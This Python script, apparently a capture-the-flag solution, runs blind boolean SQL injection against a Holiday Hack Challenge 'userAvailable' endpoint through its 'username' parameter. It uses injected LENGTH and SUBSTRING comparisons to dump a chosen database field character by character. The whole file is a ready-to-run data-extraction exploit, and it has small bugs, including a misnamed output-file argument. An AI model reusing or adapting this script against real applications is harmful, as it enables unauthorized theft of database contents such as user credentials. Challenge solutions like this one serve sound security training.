# dumpField.py

import requests
import logging
import os
import argparse
import string

###########
# GLOBALS #
###########
uid = 'b3167174-051a-4434-9e12-ad0295327127'
base_url = f'https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?id={uid}'

inject_parameter = 'username'

##########
# CONFIG #
##########
logging.basicConfig(
    format="%(asctime)s | %(levelname)-8s | %(name)s | %(funcName)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger(os.path.basename(__file__))

#############
# FUNCTIONS #
#############
def sendInjection (injection, prepend=""):
	injection = f'{prepend}{injection}'
	log.debug (f'Sending injection: {injection}')
	url = f'{base_url}&{inject_parameter}={injection}'
	log.debug (f'Performing request to: {url}')
	
	r = requests.get(url).json()
	log.debug (f'Response is: {r}')

	return r

def getStringLength (colname, prepend=""):
	i = 0
	finished = False
	while not finished:
		injection = f'" AND LENGTH(c.{colname}) = {i} --'
		log.debug (f'Injection string is: {injection}')
		r = sendInjection (injection, prepend)

		if r.get('available') == False:
			finished = True
		else: 
			i += 1

	return i

def dumpData (field_name, prepend=""):
	log.info (f'Dumping data for field: {field_name}')

	stringLength = getStringLength (field_name, prepend)
	log.info (f'Length of data is: {stringLength}')

	output = ""
	for i in range(stringLength):
		for char in string.printable:
			injection = f'" AND SUBSTRING(c.{field_name}, {i}, 1) = \'{char}\' --  '
			log.debug (f'Injection string is: {injection}')
			r = sendInjection (injection, prepend)

			if r.get('available') == False:
				output += char
				break

	log.info (f'Found content: {field_name} --> {output}')

	return output

# -- Args parsing --
def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("field_name", help="The name of the field to fetch")
    parser.add_argument("--verbose", "-v", action="count", default=0, help="Increase verbosity (use -vv for very verbose / debug)")
    parser.add_argument("--prepend", "-p", default="", help="String to prepend to all injections, comma separated - Can be used to specify usernames")
    parser.add_argument("--output_file", "-o", help="Save output to the specified file")
    return parser.parse_args()

########
# MAIN #
########
def main():
	args = parse_args()

	if args.verbose == 1:
		log.setLevel(logging.INFO)
		log.info("Log mode set to: INFO")
	elif args.verbose >= 2:
		log.setLevel(logging.DEBUG)
		log.debug("Log mode set to: DEBUG")

	if args.output_file:
		f = open (args.output, "a")
		f.write ('PREPEND,WORD,OUTPUT\n')	

	for prepend in args.prepend.split(','):
		log.info (f'Starting to dump data for field: {args.field_name}')
		output = dumpData (args.field_name, prepend)
		output_string = f'{prepend},{args.field_name},{output}'
		print (output_string)
		if args.output_file:
			f.write (f'{output_string}\n')

	if args.output_file:
		f.close()

if __name__ == "__main__":
	main()

